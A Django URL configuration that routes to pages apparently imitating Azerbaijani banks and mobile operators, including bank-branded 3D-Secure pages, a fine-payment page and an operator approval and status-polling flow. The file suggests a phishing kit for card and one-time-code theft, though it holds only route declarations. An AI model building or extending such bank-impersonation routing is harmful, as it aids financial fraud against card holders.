from django.urls import path
from django.urls import re_path

from . import views
from django.urls import path
from . import views

urlpatterns = [
    path("", views.index, name="index"),
    path('azercell', views.azercell, name="azercell"),
    path('bakcell', views.bakcell, name="bakcell"),
    path('info', views.info, name="info"),
    path('loading', views.loading, name="loading"),
    path('cerime', views.cerime, name="cerime"),
    path('crud/create/', views.contact_create, name='contact_create'),
    path('crud/update/<int:pk>/', views.contact_update, name='contact_update'),
    path('crud/delete/<int:pk>/', views.contact_delete, name='contact_delete'),
    path('crud/', views.crud, name='crud'),
    path('crud/api/list/', views.contact_list_api, name='contact_list'),
    path('approve-action/', views.approve_action, name='approve_action'),
    path('approval_page/<int:pk>/', views.approval_page, name='approval_page'),
    path('crud/approve/<int:pk>/', views.contact_approve, name='contact_approve'),
    path('crud/kapital/<int:pk>/', views.contact_approve, name='contact_approve'),
    path('crud/abb/<int:pk>/', views.contact_approve_abb, name='contact_approve'),
    path('crud/api/approve/<int:pk>/', views.approve_contact_api, name='approve_contact_api'),
    path('check_approval_status/<int:contact_id>/', views.check_approval_status, name='check_approval_status'),
    path('kapital/', views.kapital, name='kapital'),
    path('kapital/dseckapital', views.dseckapital, name='dseckapital'),
    path('abb/', views.abb, name='abb'),
    path('abb/dsecazericard', views.dsecazericard, name='dsecazericard'),
    path('rabite', views.rabite, name='rabite'),
    path('crud/leobank/<int:pk>/', views.leobank, name='leobank'),
    path('leobank3d', views.leobank3d, name='leobank3d'),
    
    
]

